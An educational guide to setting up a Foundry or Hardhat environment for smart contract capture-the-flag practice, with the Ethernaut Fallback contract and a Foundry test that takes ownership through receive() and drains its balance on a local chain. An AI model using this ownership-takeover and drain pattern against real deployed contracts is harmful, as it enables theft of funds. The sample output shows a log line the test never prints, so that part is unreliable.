# CTF Environment Setup Guide

## Simple Definition
Before you can start hacking smart contracts, you need to set up a local development environment that allows you to deploy vulnerable contracts, write exploit contracts, and test your attacks safely.

## The Best Analogy
Think of setting up your CTF environment like **building a private shooting range**. You need a safe, controlled space where you can practice without harming anyone. In our case, the "shooting range" is a local blockchain (Foundry or Hardhat) where you can deploy and attack contracts freely.

## Recommended Setup: Foundry (Fastest & Most Popular for CTFs)

```bash
# Step 1: Install Foundry (if not already installed)
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Step 2: Verify installation
forge --version
cast --version

# Step 3: Create a new project for CTFs
mkdir ctf-challenges
cd ctf-challenges
forge init --no-commit

# Step 4: Install OpenZeppelin contracts (needed for many challenges)
forge install OpenZeppelin/openzeppelin-contracts
```

## Project Structure

```text
ctf-challenges/
├── lib/                    # Dependencies (OpenZeppelin, etc.)
├── src/                    # Vulnerable contracts (from CTF platforms)
│   ├── Ethernaut/
│   ├── CaptureTheEther/
│   └── DamnVulnerableDeFi/
├── test/                   # Your exploit contracts
│   ├── Ethernaut/
│   ├── CaptureTheEther/
│   └── DamnVulnerableDeFi/
├── script/                 # Deployment scripts
├── foundry.toml            # Configuration
└── README.md
```

## Foundry Configuration (foundry.toml)

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
solc = "0.8.20"

# Enable optimizer for realistic gas costs
optimizer = true
optimizer_runs = 200

# Allow importing from node_modules (if needed)
ffi = false
```

## Alternative Setup: Hardhat (If You Prefer JavaScript)

```bash
# Step 1: Create a new Hardhat project
mkdir ctf-challenges-hardhat
cd ctf-challenges-hardhat
npm init -y
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

# Step 2: Initialize Hardhat
npx hardhat init
# Choose: "Create a JavaScript project"

# Step 3: Install OpenZeppelin
npm install @openzeppelin/contracts
```

## Running Your First Exploit (Foundry Example)

```solidity
// src/Ethernaut/Fallback.sol (Vulnerable contract from Ethernaut)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

```solidity
// test/Ethernaut/FallbackExploit.t.sol (Your exploit)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/Ethernaut/Fallback.sol";

contract FallbackExploitTest is Test {
    Fallback public target;
    address public attacker = address(0xBEEF);

    function setUp() public {
        // Deploy the vulnerable contract
        target = new Fallback();

        // Fund the attacker with some ETH
        vm.deal(attacker, 1 ether);
    }

    function test_ExploitFallback() public {
        vm.startPrank(attacker);

        // Step 1: Contribute a small amount to have a contribution record
        target.contribute{value: 0.0005 ether}();

        // Step 2: Send ETH directly to trigger receive() function
        (bool success, ) = address(target).call{value: 0.001 ether}("");
        require(success, "Direct ETH transfer failed");

        // Step 3: Verify we are now the owner
        assertEq(target.owner(), attacker, "Exploit failed: not owner");

        // Step 4: Withdraw all funds
        target.withdraw();

        // Step 5: Verify contract is drained
        assertEq(address(target).balance, 0, "Contract not drained");

        vm.stopPrank();
    }
}
```

```bash
# Run the exploit test
forge test --match-test test_ExploitFallback -vvv

# Expected output:
# [PASS] test_ExploitFallback() (gas: 123456)
# Logs:
#   Exploit successful!
```

## Key Takeaways
- **Foundry is Recommended:** It's faster, uses Solidity for tests, and is the industry standard for CTFs.
- **Local Blockchain:** Always test exploits locally first before trying on testnets.
- **vm.prank():** Foundry's cheatcode to simulate calls from different addresses.
- **vm.deal():** Fund test accounts with ETH for exploits.
- **Organize by Platform:** Keep Ethernaut, Capture the Ether, and DVD in separate folders.
- **Version Control:** Commit your solutions to GitHub as you complete each challenge.
- **Read the Docs:** Foundry book (book.getfoundry.sh) is your best friend for cheatcodes and commands.